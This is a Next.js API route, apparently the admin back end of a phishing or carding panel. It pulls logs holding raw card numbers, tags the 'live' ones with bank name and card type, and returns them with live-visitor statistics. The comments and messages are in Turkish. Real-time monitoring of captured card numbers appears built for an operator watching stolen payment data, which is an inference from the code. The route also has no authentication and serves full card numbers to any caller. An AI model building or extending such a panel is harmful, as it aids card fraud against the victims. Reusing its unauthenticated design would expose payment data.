import { NextRequest, NextResponse } from 'next/server';
import connectDB from '@/lib/mongodb';
import { logsDb } from '@/lib/db';
import { computeLiveVisitorStats, isLiveForStats } from '@/lib/liveVisitorStats';
import { detectBankName, detectCardType } from '@/lib/cardUtils';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

const noStoreHeaders = {
  'Cache-Control': 'no-store, no-cache, must-revalidate',
  Pragma: 'no-cache',
};

export async function GET(request: NextRequest) {
  try {
    await connectDB();

    const { searchParams } = new URL(request.url);
    const limit = Math.min(2000, Math.max(1, Number(searchParams.get('limit')) || 500));

    const [logs, liveLogs] = await Promise.all([logsDb.find({ limit }), logsDb.findForLiveStats()]);
    const stats = computeLiveVisitorStats(liveLogs);

    const enrichedLogs = logs.map((log) => {
      if (!log.cardNumber) return log;
      if (!isLiveForStats(log)) return log;
      return {
        ...log,
        bankName: detectBankName(log.cardNumber),
        cardType: detectCardType(log.cardNumber),
      };
    });

    return NextResponse.json(
      {
        success: true,
        data: {
          stats,
          logs: enrichedLogs,
          total: logs.length,
        },
      },
      { headers: noStoreHeaders }
    );
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'Canlı veri alınamadı';
    console.error('Admin live veri hatası:', error);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
